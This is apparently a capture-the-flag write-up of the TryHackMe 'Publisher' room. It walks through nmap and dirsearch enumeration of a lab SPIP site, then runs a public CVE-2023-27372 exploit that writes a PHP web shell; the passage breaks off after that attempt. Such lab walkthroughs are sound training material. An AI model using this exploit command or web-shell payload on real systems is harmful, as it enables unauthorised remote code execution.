# <div align="center">[Publisher](https://tryhackme.com/r/room/publisher)</div>
<div align="center">
  <img src="https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1718377893997" height="300"></img>
</div>

###### The “Publisher” CTF machine is a simulated environment hosting some services. Through a series of enumeration techniques, including directory fuzzing and version identification, a vulnerability is discovered, allowing for Remote Code Execution (RCE). Attempts to escalate privileges using a custom binary are hindered by restricted access to critical system files and directories, necessitating a deeper exploration into the system’s security profile to ultimately exploit a loophole that enables the execution of an unconfined bash shell and achieve privilege escalation.

* ##  Enumeration
### Let Make a Nmap Scan
```
death@esther:~$ nmap 10.10.102.137 -sV 
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-09 18:58 IST
Nmap scan report for 10.10.102.137
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.10 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 27.16 seconds
```
### According to scan 2 ports are open.
* ### SSH on port 22.
* ### HTTP on port 80.

### As HTTP is open let take a look.

![image](https://github.com/user-attachments/assets/d57d3ac9-fc20-45f4-b088-06e3febe28e7)

### I didn't Find anything, Let enumerate directories.

```
dirsearch -u <Ip> -w <wordlist>
```
```
death@esther:~$ dirsearch -u 10.10.102.137 -w ~/wordlists/directory-list-2.3-medium.txt 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 220544

Output File: /home/death/reports/_10.10.102.137/_24-09-09_19-00-50.txt

Target: http://10.10.102.137/

[19:00:51] Starting: 
[19:00:53] 301 -  315B  - /images  ->  http://10.10.102.137/images/
[19:01:53] 301 -  313B  - /spip  ->  http://10.10.102.137/spip/
[19:12:30] 403 -  278B  - /server-status

Task Completed
```
### Let navigate to Spip

![image](https://github.com/user-attachments/assets/4594f119-0380-425d-8ee3-b2b6857e5078)

### Let enumerate /spip/ directory,

```
death@esther:~$ dirsearch -u 10.10.102.137/spip/ 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/death/reports/_10.10.102.137/_spip__24-09-09_19-39-28.txt

Target: http://10.10.102.137/

[19:39:28] Starting: spip/
[19:39:35] 403 -  278B  - /spip/.ht_wsr.txt
[19:39:35] 403 -  278B  - /spip/.htaccess.orig
[19:39:35] 403 -  278B  - /spip/.htaccess.bak1
[19:39:35] 403 -  278B  - /spip/.htaccess.sample
[19:39:35] 403 -  278B  - /spip/.htaccess.save
[19:39:35] 403 -  278B  - /spip/.htaccess_extra
[19:39:35] 403 -  278B  - /spip/.htaccess_orig
[19:39:35] 403 -  278B  - /spip/.htaccess_sc
[19:39:35] 403 -  278B  - /spip/.htaccessBAK
[19:39:35] 403 -  278B  - /spip/.htaccessOLD
[19:39:36] 403 -  278B  - /spip/.htaccessOLD2
[19:39:36] 403 -  278B  - /spip/.htm
[19:39:36] 403 -  278B  - /spip/.html
[19:39:36] 403 -  278B  - /spip/.htpasswds
[19:39:36] 403 -  278B  - /spip/.htpasswd_test
[19:39:36] 403 -  278B  - /spip/.httr-oauth
[19:39:38] 403 -  278B  - /spip/.php
[19:40:04] 200 -    7KB - /spip/CHANGELOG.md
[19:40:05] 200 -    2KB - /spip/composer.json
[19:40:06] 301 -  320B  - /spip/config  ->  http://10.10.102.137/spip/config/
[19:40:06] 200 -   27KB - /spip/composer.lock
[19:40:06] 200 -  570B  - /spip/config/
[19:40:18] 200 -    2KB - /spip/htaccess.txt
[19:40:20] 200 -    3KB - /spip/index.php
[19:40:20] 200 -    3KB - /spip/index.php/login/
[19:40:24] 200 -   34KB - /spip/LICENSE
[19:40:24] 301 -  319B  - /spip/local  ->  http://10.10.102.137/spip/local/
[19:40:24] 200 -  609B  - /spip/local/
[19:40:40] 200 -  842B  - /spip/README.md
[19:40:51] 301 -  317B  - /spip/tmp  ->  http://10.10.102.137/spip/tmp/
[19:40:51] 200 -  712B  - /spip/tmp/
[19:40:51] 200 -  527B  - /spip/tmp/sessions/
[19:40:54] 200 -    0B  - /spip/vendor/autoload.php
[19:40:54] 200 -  535B  - /spip/vendor/
[19:40:54] 200 -    0B  - /spip/vendor/composer/autoload_namespaces.php
[19:40:54] 200 -    0B  - /spip/vendor/composer/ClassLoader.php
[19:40:54] 200 -    0B  - /spip/vendor/composer/autoload_files.php
[19:40:54] 200 -    0B  - /spip/vendor/composer/autoload_real.php
[19:40:54] 200 -    0B  - /spip/vendor/composer/autoload_classmap.php
[19:40:54] 200 -    0B  - /spip/vendor/composer/autoload_psr4.php
[19:40:54] 200 -    0B  - /spip/vendor/composer/autoload_static.php
[19:40:54] 200 -    1KB - /spip/vendor/composer/LICENSE
[19:40:54] 200 -   15KB - /spip/vendor/composer/installed.json

Task Completed
```
### Let take a view at local directory,


![image](https://github.com/user-attachments/assets/150dde31-a165-41df-bc6d-2be259f14e9c)

### Let View this config file.

![image](https://github.com/user-attachments/assets/dd67373e-b2f5-41da-8821-d82aafb4a172)

### The version is mentioned here let search for any CVE or Exploit.

![image](https://github.com/user-attachments/assets/87de6806-b78d-4562-bc0a-cc9024cdda94)

### As i thought there is ```CVE-2023-27372``` is present, here is the link of exploit [CVE-2023-27372](https://github.com/nuts7/CVE-2023-27372)

* ### git clone https://github.com/nuts7/CVE-2023-27372
* ### cd cd CVE-2023-27372/

### Now Let take a try might be it will work.
* ###  Let try getuid of system.
```
python3 CVE-2023-27372.py -u http://10.10.102.137/spip -c 'echo "<?php system(\$_GET[\"cmd\"]); ?>" > test.php'  -v
```

### Requirenment not isntalling issue
